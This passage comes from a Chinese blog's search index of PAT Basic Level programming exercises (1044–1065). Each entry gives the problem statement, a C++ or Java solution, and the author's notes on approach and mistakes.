&lt;&lt; endl; } return 0;} 思路与注意 13, 26, 39…转换为13进制后，tret不输出 题目说数是属于[0,169)的，所以翻译以后最多有两位。根据这个性质，只算两位就好。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1044-%E7%81%AB%E6%98%9F%E6%95%B0%E5%AD%97(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1045","text":"题目 著名的快速排序算法里有一个经典的划分过程：我们通常采用某种方法取一个元素作为主元，通过交换，把比主元小的元素放到它的左边，比主元大的元素放到它的右边。 给定划分后的 N 个互不相同的正整数的排列，请问有多少个元素可能是划分前选取的主元？ 例如给定 $N = 5$, 排列是1、3、2、4、5。则： 1 的左边没有元素，右边的元素都比它大，所以它可能是主元； 尽管 3 的左边元素都比它小，但其右边的 2 比它小，所以它不能是主元； 尽管 2 的右边元素都比它大，但其左边的 3 比它大，所以它不能是主元； 类似原因，4 和 5 都可能是主元。 因此，有 3 个元素可能是主元。 输入格式： 输入在第 1 行中给出一个正整数 N（≤105）； 第 2 行是空格分隔的 N 个不同的正整数，每个数不超过 109。 输出格式： 在第 1 行中输出有可能是主元的元素个数；在第 2 行中按递增顺序输出这些元素，其间以 1 个空格分隔，行首尾不得有多余空格。 输入样例：1251 3 2 4 5 输出样例：1231 4 5 通过代码 123456789101112131415161718192021222324252627#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int arr[1000000], brr[1000000], crr[1000000];int main () { int n, m = 0; scanf (&quot;%d&quot;, &amp;n); for (int i = 0; i &lt; n; i++) { scanf (&quot;%d&quot;, &amp;arr[i]); brr[i] = arr[i]; } sort(brr, brr + n); int max = -999999; for (int i = 0; i &lt; n; i++) { if (max &lt; arr[i]) max = arr[i]; if (arr[i] == brr[i] &amp;&amp; max == arr[i]) { crr[m++] = arr[i]; } } printf (&quot;%d\\n&quot;, m); if (m &gt; 0) printf(&quot;%d&quot;, crr[0]); for (int i = 1; i &lt; m ; i++) { printf (&quot; %d&quot;, crr[i]); } printf (&quot;\\n&quot;); return 0;} 思路与注意 只要满足一个数的左边没有数或者数都比它小，右边没有元素或者都比它大，它就可能是主元。根据这个思路，写一个O(N^2)的算法肯定会超时 根据快速排序的思想，挑选一个数作为主元，把比它小的数放左边，比它大的放右边，这样然后以主元为分界线，两边视为两个数组重新进行以上操作，直到不能再细分。排序完成。我们可以得到主元在排序前后位置不变且左边的数都比它小，这样，算法就变成了 对数组进行排序，比较那些元素的位置没有变 判断这个数是不是从左往右的最大值 这样就O(N)了 反思与评价 快速排序(25)参考了这个教程，希望以后能更多的独立思考，锻炼思考能力 加油小天天ヾ(◍°∇°◍)ﾉﾞ，你是最胖的！","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1045-%E5%BF%AB%E9%80%9F%E6%8E%92%E5%BA%8F(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1048","text":"题目 本题要求实现一种数字加密方法。首先固定一个加密用正整数 A，对任一正整数 B，将其每 1 位数字与 A 的对应位置上的数字进行以下运算： 对奇数位，对应位的数字相加后对 13 取余——这里用 J 代表 10、Q 代表 11、K 代表 12；对偶数位，用 B 的数字减去 A 的数字，若结果为负数，则再加 10。这里令个位为第 1 位。 输入格式： 输入在一行中依次给出 A 和 B，均为不超过 100 位的正整数，其间以空格分隔。 输出格式： 在一行中输出加密后的结果。 输入样例：1234567 368782971 输出样例：3695Q8118 通过代码12345678910111213141516171819202122232425262728293031323334353637383940414243import java.util.*;public class Main { static Scanner sc;\b static { sc = new Scanner(System.in); } static int max(int a, int b) { return a &gt; b ? a : b; } public static void main(String[] args) { // code here String in = sc.nextLine(); StringBuffer a = new StringBuffer(in.substring(0, in.indexOf(' '))); StringBuffer b = new StringBuffer(in.substring(in.indexOf(' ') + 1, in.length())); StringBuffer ans = new StringBuffer(); //字符和数字互转 char[] num = new char[13]; for (int i = 0; i &lt; 10; i++) { num[i] = (char) (i + '0'); } num[10] = 'J'; num[11] = 'Q'; num[12] = 'K'; int[] Char = new int[128]; for (char i = '0'; i &lt;= '9'; i++) {Char[i] = i - '0';} Char['J'] = 10;Char['Q'] = 11;Char['K'] = 12; int len = max(a.length(), b.length()); StringBuffer temp = new StringBuffer(); for (int i = 0; i &lt; len - a.length(); i++) { temp.append('0'); } a.insert(0, temp.toString()); temp = new StringBuffer(); for (int i = 0; i &lt; len - b.length(); i++) { temp.append('0'); } b.insert(0, temp.toString()); int cmp = len % 2; for (int i = 0; i &lt; len; i++) { char x; if ((i + 1) % 2 == cmp) { x = num[(Char[a.charAt(i)] + Char[b.charAt(i)]) % 13]; ans.append(x); } else { int n = (Char[b.charAt(i)] - Char[a.charAt(i)]); x = num[n &gt;= 0 ? n : n + 10]; ans.append(x); } } System.out.println(ans); }} 反思与评价反思&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;这道题是用Java写的，总体来说没有什么难度，但是\b题目中规定各位为第一位，我直接用for从0开始循环判断(i+1)的\b\b奇偶性，这就导致最长位数如果是奇数，那么个位就是奇数位，反之则为偶数位。&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;&amp;#160;为了解决这个缺陷，考虑到如果最长位数为偶数\b，\b操作跟原来互换就好\b，就要把0变成1，\b1变成0，所以我定义了一个整型cmp，\b它的值为len%2，这样就解决了。 评价&amp;#160;&amp;#160;&amp;#160;&amp;#160;题目简单，没什么好说的，但是代码看起来还是太复杂。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1048-%E6%95%B0%E5%AD%97%E5%8A%A0%E5%AF%86(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1050","text":"题目 本题要求将给定的 N 个正整数按非递增的顺序，填入“螺旋矩阵”。所谓“螺旋矩阵”，是指从左上角第 1 个格子开始，按顺时针螺旋方向填充。要求矩阵的规模为 m 行 n 列，满足条件：m×n 等于 N；m≥n；且 m−n 取所有可能值中的最小值。 输入格式： 输入在第 1 行中给出一个正整数 N，第 2 行给出 N 个待填充的正整数。所有数字不超过 104，相邻数字以空格分隔。 输出格式： 输出螺旋矩阵。每行 n 个数字，共 m 行。相邻数字以 1 个空格分隔，行末不得有多余空格。 输入样例：121237 76 20 98 76 42 53 95 60 81 58 93 输出样例：123498 95 9342 37 8153 20 7658 60 76 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;vector&gt;#include &lt;algorithm&gt;using namespace std;void get_mn(int* m, int* n, int N) { int i = 0; do { *n = sqrt(N) - i; *m = N / (*n); i++; } while ((*m) * (*n) != N);}int main() { int n; int t; vector&lt;int&gt; arr; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; t; arr.push_back(t); } sort(arr.begin(), arr.end()); int count = n - 1; int N, M; get_mn(&amp;M, &amp;N, n); vector&lt;vector&lt;int&gt; &gt; a; vector&lt;int&gt; temp(N); for (int i = 0; i &lt; M; i++) { a.push_back(temp); } int i = 0; while (count &gt;= 0) { for (int j = i; j &lt; N - 1 - i &amp;&amp; i &lt; M; j++)//①从下标i开始，直到N - 1 - i a[i][j] = arr[count--]; for (int j = i; j &lt; M - i &amp;&amp; i &lt; N; j++)//②从下标i开始，直到M - i a[j][N - 1 - i] = arr[count--]; for (int j = N - 1 - i - 1; j &gt; i - 1 &amp;&amp; i &lt; M; j--)//①的倒序 a[M - 1 - i][j] = arr[count--]; if (N - 1 - i &gt; i) for (int j = M - 1 - i - 1; j &gt; i &amp;&amp; i &lt; N; j--)//②的倒序 a[j][i] = arr[count--]; i++; } for (int i = 0; i &lt; M; i++) { cout &lt;&lt; a[i][0]; for (int j = 1; j &lt; N; j++) cout &lt;&lt; &quot; &quot; &lt;&lt; a[i][j]; cout &lt;&lt; endl; }} 思路与注意 先把数储存，再顺序输出 以一圈为单位，4个循环填好一圈 记录第几圈，以这个数确定每次从哪里开始填数 最后要判断( N - 1 - i &gt; i ) 计算MN时要注意(n/N)*N 不一定等于 n 反思与评价 一直没有考虑到判断( N - 1 - i &gt; i ) 计算MN的时候想的太简单","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1050-%E8%9E%BA%E6%97%8B%E7%9F%A9%E9%98%B5(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1052","text":"题目萌萌哒表情符号通常由“手”、“眼”、“口”三个主要部分组成。简单起见，我们假设一个表情符号是按下列格式输出的： 1[左手]([左眼][口][右眼])[右手] 现给出可选用的符号集合，请你按用户的要求输出表情。 输入格式：输入首先在前三行顺序对应给出手、眼、口的可选符号集。每个符号括在一对方括号 []内。题目保证每个集合都至少有一个符号，并不超过 10 个符号；每个符号包含 1 到 4 个非空字符。 之后一行给出一个正整数 K，为用户请求的个数。随后 K 行，每行给出一个用户的符号选择，顺序为左手、左眼、口、右眼、右手——这里只给出符号在相应集合中的序号（从 1 开始），数字间以空格分隔。 输出格式：对每个用户请求，在一行中输出生成的表情。若用户选择的序号不存在，则输出 Are you kidding me? @\\/@。 输入样例：12345678[╮][╭][o][~\\][/~] [&lt;][&gt;] [╯][╰][^][-][=][&gt;][&lt;][@][⊙][Д][▽][_][ε][^] ...41 1 2 2 26 8 1 5 53 3 4 3 32 10 3 9 3 输出样例：1234╮(╯▽╰)╭&lt;(@Д=)/~o(^ε^)oAre you kidding me? @\\/@ 通过代码123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include &lt;vector&gt;using namespace std;int main () { vector&lt;string&gt; data[3]; string line; for (int j = 0; j &lt; 3; j++) { getline(cin, line); for (int i = 0, k = 0, count = 0; i &lt; line.length(); count++) { while ( i &lt; line.length() &amp;&amp; line[i] != '[')i++; while ( k &lt; line.length() &amp;&amp; line[k] != ']')k++; if (i &lt; line.length() &amp;&amp; k &lt; line.length()) { data[j].push_back(line.substr(i + 1, k - 1 - i)); k++; i = k; } else { break; } } } int n; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { int a[5]; for (int j = 0; j &lt; 5; j++) { cin &gt;&gt; a[j]; a[j]--; } if (a[0] &lt; data[0].size() &amp;&amp; a[1] &lt; data[1].size() &amp;&amp; a[2] &lt; data[2].size() &amp;&amp; a[3] &lt; data[1].size() &amp;&amp; a[4] &lt; data[0].size()) cout &lt;&lt; data[0][a[0]] &lt;&lt; &quot;(&quot; &lt;&lt; data[1][a[1]] &lt;&lt; data[2][a[2]] &lt;&lt; data[1][a[3]] &lt;&lt; &quot;)&quot; &lt;&lt; data[0][a[4]] &lt;&lt; endl; else printf(&quot;Are you kidding me? @\\\\/@\\n&quot;); }} 思路与注意 这道题其实就是分析字符串，把所有[]内的字符串全都存起来，然后用户输入序号，根据序号按照条件输出就可以了 注意[]内不一定只有一个字符，而且可能是宽字符（直接保存成string就行） 注意用户输入的序号是从1开始的 注意输出格式（左手右边、右手左边有半角括号） 1[左手]([左眼][口][右眼])[右手] 反思与评价 这道题思路很清晰，利用vector会很方便 写题的时候一直认为substr()函数的两个参数都是index，一直出错（手动笑哭）","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1052-%E5%8D%96%E4%B8%AA%E8%90%8C(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1054","text":"题目 本题的基本要求非常简单：给定 N 个实数，计算它们的平均值。但复杂的是有些输入数据可能是非法的。一个“合法”的输入是 [−1000,1000] 区间内的实数，并且最多精确到小数点后 2 位。当你计算平均值的时候，不能把那些非法的数据算在内。 输入格式： 输入第一行给出正整数 N（≤100）。随后一行给出 N 个实数，数字间以一个空格分隔。 输出格式： 对每个非法输入，在一行中输出 ERROR: X is not a legal number，其中 X 是输入。最后在一行中输出结果：The average of K numbers is Y，其中 K 是合法输入的个数，Y 是它们的平均值，精确到小数点后 2 位。如果平均值无法计算，则用 Undefined 替换 Y。如果 K 为 1，则输出 The average of 1 number is Y。 输入样例 1：1275 -3.2 aaa 9999 2.3.4 7.123 2.35 输出样例 1：12345ERROR: aaa is not a legal numberERROR: 9999 is not a legal numberERROR: 2.3.4 is not a legal numberERROR: 7.123 is not a legal numberThe average of 3 numbers is 1.38 输入样例 2：122aaa -9999 输出样例 2：123ERROR: aaa is not a legal numberERROR: -9999 is not a legal numberThe average of 0 numbers is Undefined 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;cmath&gt;#include &lt;iomanip&gt;using namespace std;bool check(string t, double* x) { int dot = -1; int dotNum = 0; bool ok = true; int i = 0; if (t[i] == '-')i++; for ( ; i &lt; t.length(); i++) { if (!(t[i] &gt;= '0' &amp;&amp; t[i] &lt;= '9')) { if (t[i] == '.') { dotNum++; if (dotNum == 1) dot = i; } else { ok = false; break; } } } if (dotNum &gt; 1) ok = false; if (dot != -1 &amp;&amp; t.length() - dot - 1 &gt; 2)ok = false; if (ok) { *x = atof(t.data()); if (fabs(*x) &gt; 1000) ok = false; } return ok;}int main() { int n; cin &gt;&gt; n; int count = 0; double sum = 0; string str; for (int j = 0; j &lt; n; j++) { double StrToNum = 0; cin &gt;&gt; str; if (check(str, &amp;StrToNum)) { sum += StrToNum; count++; } else { cout &lt;&lt; &quot;ERROR: &quot; &lt;&lt; str &lt;&lt; &quot; is not a legal number&quot; &lt;&lt; endl; } } if (count == 1) { cout &lt;&lt; &quot;The average of &quot; &lt;&lt; count &lt;&lt; &quot; number is &quot; &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; sum / count &lt;&lt; endl; } else if (count == 0) { cout &lt;&lt; &quot;The average of 0 numbers is Undefined&quot; &lt;&lt; endl; } else { cout &lt;&lt; &quot;The average of &quot; &lt;&lt; count &lt;&lt; &quot; numbers is &quot; &lt;&lt; fixed &lt;&lt; setprecision(2) &lt;&lt; sum / count &lt;&lt; endl; }} 思路与注意 判断输入是否符合题目要求 利用成员函数data()把string转为char*， 再利用atof()转化为实数 统计并计算 反思与评价 没有考虑没有小数点的时候，不用计算小数点位数，一直错。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1054-%E6%B1%82%E5%B9%B3%E5%9D%87%E5%80%BC(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1055","text":"题目 拍集体照时队形很重要，这里对给定的 N 个人 K 排的队形设计排队规则如下： 每排人数为 N/K（向下取整），多出来的人全部站在最后一排； 后排所有人的个子都不比前排任何人矮； 每排中最高者站中间（中间位置为 m/2+1，其中 m 为该排人数，除法向下取整）； 每排其他人以中间人为轴，按身高非增序，先右后左交替入队站在中间人的两侧（例如5人身高为190、188、186、175、170，则队形为175、188、190、186、170。这里假设你面对拍照者，所以你的左边是中间人的右边）； 若多人身高相同，则按名字的字典序升序排列。这里保证无重名。 现给定一组拍照人，请编写程序输出他们的队形。 输入格式： 每个输入包含 1 个测试用例。每个测试用例第 1 行给出两个正整数 N（≤104，总人数）和 K（≤10，总排数）。随后 N 行，每行给出一个人的名字（不包含空格、长度不超过 8 个英文字母）和身高（[30, 300] 区间内的整数）。 输出格式： 输出拍照的队形。即K排人名，其间以空格分隔，行末不得有多余空格。注意：假设你面对拍照者，后排的人输出在上方，前排输出在下方。 输入样例：123456789101110 3Tom 188Mike 170Eva 168Tim 160Joe 190Ann 168Bob 175Nick 186Amy 160John 159 输出样例：123Bob Tom Joe NickAnn Mike EvaTim Amy John 通过代码1234567891011121314151617181920212223242526272829303132333435#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;struct data { string name; int hight; };bool cmp(data&amp; a, data&amp; b) { if (a.hight != b.hight) return a.hight &gt; b.hight; else return a.name &lt; b.name;}int main () { int n, k; cin &gt;&gt; n &gt;&gt; k; int cmin = n / k; int cmax = n % k + cmin; data arr[k][cmax], in[n]; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; in[i].name &gt;&gt; in[i].hight; } sort(in, in + n, cmp); int i = 0, c = cmax; for (int K = 0; K &lt; k; K++) { arr[K][c / 2] = in[i++]; for (int j = 0; j &lt; c / 2; j++) { if (c / 2 - j - 1 &gt;= 0) arr[K][c / 2 - j - 1] = in[i++]; if (c / 2 + j + 1 &lt; c) arr[K][c / 2 + j + 1] = in[i++]; } c = cmin; } c = cmax; for (int i = 0; i &lt; k; i++) { cout &lt;&lt; arr[i][0].name; for (int j = 1; j &lt; c; j++) cout &lt;&lt; &quot; &quot; &lt;&lt; arr[i][j].name; cout &lt;&lt; endl; c = cmin; }} 思路与注意 输入，排序（按身高降序，身高一样按名字的ASCII值升序） 计算每排人数cmin，最后一排人数cmax。然后往里面存。 存和输出时，最后一排和其他排人数不一样，所以令列数c = cmax，每次循环完令c = cmin 由于把最后一排和其他排都统一起来考虑，所以每次存的时候要判断下标有没有越界 反思与评价 开心，题目越做越顺手","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1055-%E9%9B%86%E4%BD%93%E7%85%A7(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1058","text":"题目 批改多选题是比较麻烦的事情，本题就请你写个程序帮助老师批改多选题，并且指出哪道题错的人最多。 输入格式： 输入在第一行给出两个正整数 N（≤ 1000）和 M（≤ 100），分别是学生人数和多选题的个数。随后 M 行，每行顺次给出一道题的满分值（不超过 5 的正整数）、选项个数（不少于 2 且不超过 5 的正整数）、正确选项个数（不超过选项个数的正整数）、所有正确选项。注意每题的选项从小写英文字母 a 开始顺次排列。各项间以 1 个空格分隔。最后 N 行，每行给出一个学生的答题情况，其每题答案格式为 (选中的选项个数 选项1 ……)，按题目顺序给出。注意：题目保证学生的答题情况是合法的，即不存在选中的选项数超过实际选项数的情况。 输出格式： 按照输入的顺序给出每个学生的得分，每个分数占一行。注意判题时只有选择全部正确才能得到该题的分数。最后一行输出错得最多的题目的错误次数和编号（题目按照输入的顺序从 1 开始编号）。如果有并列，则按编号递增顺序输出。数字间用空格分隔，行首尾不得有多余空格。如果所有题目都没有人错，则在最后一行输出 Too simple。 输入样例：3 4 3 4 2 a c 2 5 1 b 5 3 2 b c 1 5 4 a b d e (2 a c) (2 b d) (2 a c) (3 a b e) (2 a c) (1 b) (2 a b) (4 a b d e) (2 b d) (1 e) (2 b c) (4 a b c d) 输出样例：3 6 5 2 2 3 4 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;vector&gt;using namespace std;class Option { public: int score; int optionNum; int corOptionNum; int FalseNum; int num; vector&lt;char&gt; correctOption; Option() { score = 0; optionNum = 0; corOptionNum = 0; FalseNum = 0; num = 0; } Option(Option &amp;other) { score = other.score; optionNum = other.optionNum; corOptionNum = other.corOptionNum; correctOption = other.correctOption; } friend istream &amp;operator&gt;&gt;(istream &amp;file, Option &amp;object);};istream &amp;operator&gt;&gt;(istream &amp;file, Option &amp;object) { file &gt;&gt; object.score &gt;&gt; object.optionNum &gt;&gt; object.corOptionNum; for (int i = 0; i &lt; object.corOptionNum; i++) { file.ignore(); char temp; file &gt;&gt; temp; object.correctOption.push_back(temp); } return file;}class choose { public: int num; vector&lt;char&gt; option; friend istream &amp;operator&gt;&gt;(istream &amp;file, choose &amp;object); friend ostream &amp;operator&lt;&lt;(ostream &amp;file, choose &amp;object); void clear() { option.clear(); num = 0; }};istream &amp;operator&gt;&gt;(istream &amp;file, choose &amp;object) { char x; cin &gt;&gt; x; file &gt;&gt; object.num; for (int i = 0; i &lt; object.num; i++) { file.ignore(); char temp; file &gt;&gt; temp; object.option.push_back(temp); } file.ignore(); return file;}class Stu { public: vector&lt;choose&gt; cho; int score; Stu() { score = 0; } Stu(Stu &amp;other) { cho = other.cho; score = other.score; }};int main() { int n, m; cin &gt;&gt; n &gt;&gt; m; Stu student[n]; Option op[m]; choose choTemp; bool hasFalse = false; for (int i = 0; i &lt; m; i++) { cin &gt;&gt; op[i]; op[i].num = i + 1; } for (int i = 0; i &lt; n; i++) { for (int j = 0; j &lt; m; j++) { choTemp.clear(); cin &gt;&gt; choTemp; cin.ignore(); student[i].cho.push_back(choTemp); } for (int j = 0; j &lt; m; j++) { if (student[i].cho[j].option == op[j].correctOption) { student[i].score += op[j].score; } else { hasFalse = true; op[j].FalseNum++; } } } for (int i = 0; i &lt; n; i++) { cout &lt;&lt; student[i].score &lt;&lt; endl; } if (hasFalse) { int max = op[0].FalseNum; for (int i = 0; i &lt; m; i++) { if (max &lt; op[i].FalseNum) { max = op[i].FalseNum; } } cout &lt;&lt; max; for (int i = 0; i &lt; m; i++) { if (op[i].FalseNum == max) { cout &lt;&lt; ' ' &lt;&lt; op[i].num; } } cout &lt;&lt; endl; } else { cout &lt;&lt; &quot;Too simple&quot; &lt;&lt; endl; } return 0;} 思路与注意 利用\b类来储存信息，注意构造函数里初始化变量。 注意输入字符类型时，利用ignore()等函数跳过空白符\b 最后一行的输出是最大值 最大值的序号列表，不是最大值+序号+最大值+序号。在这里被坑住了。 输入choose类的时候用了一个choTemp输入，choose类内部采用了vector，那么每次输入完成要清空一次。 反思与评价\b这道题其实不用写这么多类，运算符重载，构造函数什么的，代码可以\b更加精简。但是这样写的好处有： 数据处理方便，不会导致main函数里面定义过多变量导致代码可读性变差。 main函数更加简洁，可以把\b思路放在\b逻辑算法上而不是数据的处理上，就像\b我们使用vector，set，map等模板时，并不需要知道其内部如何实现，使得编码效率提高。","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1058-%E9%80%89%E6%8B%A9%E9%A2%98(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1059","text":"题目 C 语言竞赛是浙江大学计算机学院主持的一个欢乐的竞赛。既然竞赛主旨是为了好玩，颁奖规则也就制定得很滑稽： 0、冠军将赢得一份“神秘大奖”（比如很巨大的一本学生研究论文集……）。 1、排名为素数的学生将赢得最好的奖品 —— 小黄人玩偶！ 2、其他人将得到巧克力。 给定比赛的最终排名以及一系列参赛者的 ID，你要给出这些参赛者应该获得的奖品。 输入格式： 输入第一行给出一个正整数 N（≤104），是参赛者人数。随后 N 行给出最终排名，每行按排名顺序给出一位参赛者的 ID（4 位数字组成）。接下来给出一个正整数 K 以及 K 个需要查询的 ID。 输出格式： 对每个要查询的 ID，在一行中输出 ID: 奖品，其中奖品或者是 Mystery Award（神秘大奖）、或者是 Minion（小黄人）、或者是 Chocolate（巧克力）。如果所查 ID 根本不在排名里，打印 Are you kidding?（耍我呢？）。如果该 ID 已经查过了（即奖品已经领过了），打印 ID: Checked（不能多吃多占）。 输入样例：123456789101112131461111666688881234555500016888800011111222288882222 输出样例：1234568888: Minion0001: Chocolate1111: Mystery Award2222: Are you kidding?8888: Checked2222: Are you kidding? 通过代码123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;using namespace std;int prime[10005] = {0, 1, 2, 2, 3};void get_prime() { for (int i = 5; i &lt; 10005; i++) { prime[i] = 2; for (int j = 2; j * j &lt;= i; j++) { if (i % j == 0) { prime[i] = 3; break; } } }}int main() { get_prime(); int rank[10005] = {0}; string str[4] = {&quot;Are you kidding?&quot;, &quot;Mystery Award&quot;, &quot;Minion&quot;, &quot;Chocolate&quot;}; string checked = &quot;Checked&quot;; int has[10005] = {0}; int n, id; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; id; rank[id] = i + 1; } cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; id; int RANK = rank[id], HAS = has[id]; if (!HAS || RANK == 0) { printf (&quot;%04d: %s\\n&quot;, id, str[prime[RANK]].data()); has[id] = 1; } else { printf (&quot;%04d: %s\\n&quot;, id, checked.data()); } } return 0;} 思路与注意 先把需要输出的字符串存起来，分别为0，1，2，3 根据题意，搞一个数组，如果是0，1，则值为0，1，其他数如果是素数为2（对应million），不是素数为3，对应chocolate 再搞一个数组，以编号为引索，记录排名 搞一个has数组，记录是否输出过 反思与评价 这道题挺简单的 通过打表记录是否为素数，可以减少计算次数","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1059-C%E8%AF%AD%E8%A8%80%E7%AB%9E%E8%B5%9B(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1060","text":"题目 英国天文学家爱丁顿很喜欢骑车。据说他为了炫耀自己的骑车功力，还定义了一个“爱丁顿数” E ，即满足有 E 天骑车超过 E 英里的最大整数 E。据说爱丁顿自己的 E 等于87。 现给定某人 N 天的骑车距离，请你算出对应的爱丁顿数 E（≤N）。 输入格式： 输入第一行给出一个正整数 N (≤105)，即连续骑车的天数；第二行给出 N 个非负整数，代表每天的骑车距离。 输出格式： 在一行中给出 N 天的爱丁顿数。 输入样例：12106 7 6 9 3 10 8 2 7 8 输出样例：16 通过代码12345678910111213141516171819#include &lt;iostream&gt;#include &lt;algorithm&gt;using namespace std;int num[1001000];int main() { int n; cin &gt;&gt; n; for (int i = 0; i &lt; n; i++) { cin &gt;&gt; num[i]; } sort(num, num + n, greater&lt;int&gt;()); for (int i = 0; i &lt; n; i++) { if (i + 1 &gt;= num[i] - 1) { cout &lt;&lt; num[i] - 1 &lt;&lt; endl; break; } } return 0;} 思路与注意 不能两层循环求出所有值再倒叙找满足的值，会超时 先排序，对于输入样例有： 110 9 8 8 7 7 6 6 3 2 通过观察可知 第1个数代表有1天超过(10-1) 第2个数代表有2天超过(9-1) 第3个数代表有3天超过(8-1) 第4个数代表有4天超过(8-1) 第5个数代表有5天超过(7-1) 第6个数代表有6天超过(7-1) 所以答案为6 根据以上方法模拟即可 反思与评价 这题挺好","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1060-%E7%88%B1%E4%B8%81%E9%A1%BF%E6%95%B0(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1062","text":"题目 一个分数一般写成两个整数相除的形式：N/M，其中 M 不为0。最简分数是指分子和分母没有公约数的分数表示形式。 现给定两个不相等的正分数 N1/M1 和 N2/M2，要求你按从小到大的顺序列出它们之间分母为 K 的最简分数。 输入格式： 输入在一行中按 N/M 的格式给出两个正分数，随后是一个正整数分母 K，其间以空格分隔。题目保证给出的所有整数都不超过 1000。 输出格式： 在一行中按 N/M 的格式列出两个给定分数之间分母为 K 的所有最简分数，按从小到大的顺序，其间以 1 个空格分隔。行首尾不得有多余空格。题目保证至少有 1 个输出。 输入样例：17/18 13/20 12 输出样例：15/12 7/12 通过代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;iostream&gt;using namespace std;typedef long long ll;class Main {private: ll ans1, ans2, pos;public: Main(ll a, ll b) { set(a, b); } void set(ll a, ll b) { pos = 1; ans1 = a; ans2 = b; if (a &lt; 0) { ans1 *= -1; pos *= -1; } if (b &lt; 0) { ans2 *= -1; pos *= -1; } } void getSmall() { ll ta = ans1, tb = ans2; while (tb != 0) { ll temp = ta % tb; ta = tb; tb = temp; } ans1 /= ta; ans2 /= ta; } static void swap(Main&amp; a, Main&amp; b) {Main temp = a; a = b; b = temp; } static void add(Main* a, Main* b, Main* ans) { ll ans1 = a-&gt;ans1 * b-&gt;ans2 * a-&gt;pos + a-&gt;ans2 * b-&gt;ans1 * b-&gt;pos; ll ans2 = a-&gt;ans2 * b-&gt;ans2; ans-&gt;set(ans1, ans2); ans-&gt;getSmall(); } double toDouble() { return 1.0 * pos * ans1 / ans2; } ll getSon() { return ans1; } ll getMother() { return ans2; }};int main() { ll a1, a2, b1, b2, n; scanf(&quot;%lld/%lld %lld/%lld %lld&quot;, &amp;a1, &amp;a2, &amp;b1, &amp;b2, &amp;n); Main x(a1, a2), y(b1, b2), ans(1, n), one(1, n); if (x.toDouble() &gt; y.toDouble()) Main::swap(x, y); int count = 0; while (1) { if (ans.toDouble() &gt; x.toDouble() &amp;&amp; ans.toDouble() &lt; y.toDouble()) { if (ans.getMother() == n) { if (count++ == 0) cout &lt;&lt; ans.getSon() &lt;&lt; &quot;/&quot; &lt;&lt; n; else cout &lt;&lt; &quot; &quot; &lt;&lt; ans.getSon() &lt;&lt; &quot;/&quot; &lt;&lt; n; } } else if (ans.toDouble() &gt; y.toDouble()) { break; } Main::add(&amp;ans, &amp;one, &amp;ans); } return 0;} 思路与注意 copy并精简上一次写的分数处理类（传送门PAT乙级题–1034 有理数四则运算）1. 添加了转换成double（toDouble()）函数2. 得到分子分母（getSon(), getMother()）函数 3. 交换值的（swap()）函数。4. 输入后，保证x&lt;=y 得到K(我的代码中的n)，构造两个分数1/n，然后循环相加 如果数在前两个数之间（注意为开区间，不包括区间的端点），并且分母为n(每次运算后就约分一次，只挑约分后分母还是n的)，则按照要求输出。 反思与评价 代码积累很重要","link":"/home/2019/07/13/PAT-(Basic-Level)-Practice/1062-%E6%9C%80%E7%AE%80%E5%88%86%E6%95%B0(PAT-(Basic-Level)-Practice)/"},{"title":"PAT-Basic-1065","text":"题目 “单身狗”是中文对于单身人士的一种爱称。本题请你从上万人的大型派对中找出落单的客人，以便给予特殊关爱。 输入格式： 输入第一行给出一个正整数 N（≤ 50 000），是已知夫妻/伴侣的对数；随后 N 行，每行给出一对夫妻/伴侣——为方便起见，每人对应一个 ID 号，为 5 位数字（从 00000 到 99999），ID 间以空格分隔；之后给出一个正整数 M（≤ 10 000），为参加派对的总人数；随后一行给出这 M 位客人的 ID，以空格分隔。题目保证无人重婚或脚踩两条船。 输出格式： 首先第一行输出落单客人的总人数；随后第二行按 ID 递增顺序列出落单的客人。ID 间用 1 个空格分隔，行的首尾不得有多余空格。 输入样例：123456311111 2222233333 4444455555 66666755555 44444 10000 88888 22222 11111 23333 输出样例：12510000 23333 44444 55555 88888 通过代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include 